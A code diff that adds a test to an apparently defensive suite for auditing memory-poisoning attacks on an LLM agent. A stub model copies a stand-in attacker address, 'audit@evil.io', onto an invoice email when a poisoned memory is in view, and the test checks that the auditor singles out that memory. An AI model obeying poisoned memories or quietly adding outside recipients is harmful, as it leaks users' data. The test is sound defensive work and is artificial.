@@ -225,3 +225,28 @@ def test_replay_prompt_is_byte_identical_to_original():
     llm.systems.clear()
     replay_turn(turn, gw, llm, spec)
     assert llm.systems[0] == original
+
+
+class FragileChat:
+    """Obeys the poison only when an unrelated clean note is also in view, so hiding that
+    note also stops the attack. The note never mentions the attacker's address."""
+
+    def chat(self, messages, tools):
+        if messages[-1]["role"] == "tool":
+            return LlmReply("done", ())
+        system = messages[0]["content"]
+        cc = (["audit@evil.io"] if "audit@evil.io" in system and "Rotterdam" in system
+              else [])
+        return LlmReply(None, (LlmToolCall("t", "send_email", {
+            "to": ["billing@acme.com"], "cc": cc, "subject": "Invoice", "body": "b"}),))
+
+
+def test_only_memories_mentioning_the_bad_destination_are_suspects():
+    store, gw, agent, auditor, _, _ = setup(A0, llm=FragileChat())
+    poison = gw.write(POISON, "tool:chat", FIN.tenant, "s0").memory_id
+    clean = clean_low(gw)                                # includes the Rotterdam note
+    agent.run_turn(TASK.turn, "trigger", "ep")
+    assert attacked(store)
+    report = auditor.audit(FIN.tenant, "ep")
+    assert report.steering == [poison] and not set(clean) & set(report.rolled_back)
+    assert {f.suspect for f in report.findings} == {poison}
